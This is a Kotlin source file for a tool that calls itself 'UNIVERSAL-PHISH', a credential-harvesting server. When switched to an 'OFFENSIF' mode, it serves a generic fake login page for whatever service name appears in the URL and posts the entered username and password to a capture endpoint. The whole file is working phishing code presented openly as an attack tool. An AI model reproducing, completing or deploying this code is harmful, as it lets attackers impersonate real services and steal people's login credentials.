package com.fardc.sigint.core

import com.sun.net.httpserver.HttpServer
import com.sun.net.httpserver.HttpExchange
import java.net.InetSocketAddress
import java.io.OutputStream

/**
 * UNIVERSAL-PHISH v8.1 (Purified)
 * Standard: Dynamic Credential Harvesting
 * Rôle: Génération d'interfaces d'interception multi-services
 */
class UniversalPhish(private val logger: BlackBox, private val brain: StateMachine) {

    fun startVector(port: Int) {
        val server = HttpServer.create(InetSocketAddress(port), 0)
        server.createContext("/login/") { exchange ->
            handlePhish(exchange)
        }
        server.executor = null
        server.start()
        logger.recordIncident("PHISH_UP", "Serveur universel actif sur port $port")
    }

    private fun handlePhish(exchange: HttpExchange) {
        val service = exchange.requestURI.path.removePrefix("/login/")
        
        if (brain.mode != "OFFENSIF") {
            val response = "403 Forbidden: STANDBY_MODE".toByteArray()
            exchange.sendResponseHeaders(403, response.size.toLong())
            exchange.responseBody.use { it.write(response) }
            return
        }

        // Template dynamique durci
        val html = """
            <!DOCTYPE html>
            <html>
            <head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
            <body style="background:#f4f4f4; font-family:Arial; text-align:center;">
                <div style="margin-top:20%; background:white; padding:20px; display:inline-block; border-radius:8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
                    <h2 style="color:#2c3e50;">${service.uppercase()}</h2>
                    <form action="/capture/$service" method="post">
                        <input type="text" name="u" placeholder="Utilisateur" style="width:80%; padding:10px; margin-bottom:10px;"><br>
                        <input type="password" name="p" placeholder="Mot de passe" style="width:80%; padding:10px; margin-bottom:20px;"><br>
                        <button type="submit" style="background:#2980b9; color:white; border:none; padding:10px 20px; border-radius:4px;">Connexion</button>
                    </form>
                </div>
            </body>
            </html>
        """.trimIndent()

        exchange.sendResponseHeaders(200, html.length.toLong())
        val os: OutputStream = exchange.responseBody
        os.write(html.toByteArray())
        os.close()
        
        logger.recordIncident("SIGINT_PHISH", "Vecteur affiché pour le service: $service")
    }
}
